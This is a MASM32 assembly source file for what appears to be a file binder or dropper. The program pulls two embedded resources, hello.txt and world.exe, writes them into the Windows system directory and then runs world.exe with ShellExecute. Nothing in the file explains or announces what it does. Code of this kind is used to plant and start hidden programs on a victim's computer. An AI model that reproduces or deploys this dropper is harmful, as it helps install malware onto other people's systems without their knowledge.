.386
.model          flat, stdcall
option          casemap :none   

include         \masm32\include\windows.inc
include         \masm32\include\user32.inc
include         \masm32\include\kernel32.inc
include         \masm32\include\shell32.inc
includelib      \masm32\lib\user32.lib
includelib      \masm32\lib\kernel32.lib
includelib      \masm32\lib\shell32.lib

ExtractFile     PROTO :DWORD,:DWORD

;  --------------------------------------------------------------------------------
;  initialized data
;  --------------------------------------------------------------------------------

.DATA
IDI_ICON1       equ 101
TDFILE1         equ 102
TDFILE2         equ 103

LFile1          db "hello.txt",0
LFile2          db "world.exe",0

LCMDLINE        db "\",0

;  --------------------------------------------------------------------------------
;  uninitialized data
;  --------------------------------------------------------------------------------

.DATA?
hResource       dd ?
ResSize         dd ?
hOutFile        dd ?
Written         dd ?
SysDir          db 128 dup (?)


;  --------------------------------------------------------------------------------
;  start of the code
;  --------------------------------------------------------------------------------

.CODE

start:
            invoke ExtractFile, TDFILE1, ADDR LFile1
            invoke ExtractFile, TDFILE2, ADDR LFile2
            invoke ExitProcess, 0

ExtractFile PROC hFile:DWORD, myFile:DWORD
            invoke GetSystemDirectory, addr SysDir, sizeof SysDir
            invoke lstrcat, offset SysDir, addr LCMDLINE
            invoke lstrcat, offset SysDir, myFile
            invoke FindResource, NULL, hFile, RT_RCDATA
            .if eax != 0
                mov hResource, eax

                invoke SizeofResource, NULL, eax
                mov ResSize, eax

                invoke CreateFile, offset SysDir, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, \
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
                .if eax != INVALID_HANDLE_VALUE
                    mov hOutFile, eax

                    invoke LoadResource, NULL, hResource
                    invoke LockResource, eax
                    invoke WriteFile, hOutFile, eax, ResSize, ADDR Written, NULL
                    invoke CloseHandle, hOutFile
                    invoke lstrcmpi, myFile, offset LFile2
                    .if eax == 0
                        invoke ShellExecute, NULL, NULL, offset SysDir, NULL, NULL, SW_SHOWNORMAL
                    .endif
                .endif
            .endif
                    
            ret
ExtractFile ENDP

END         start
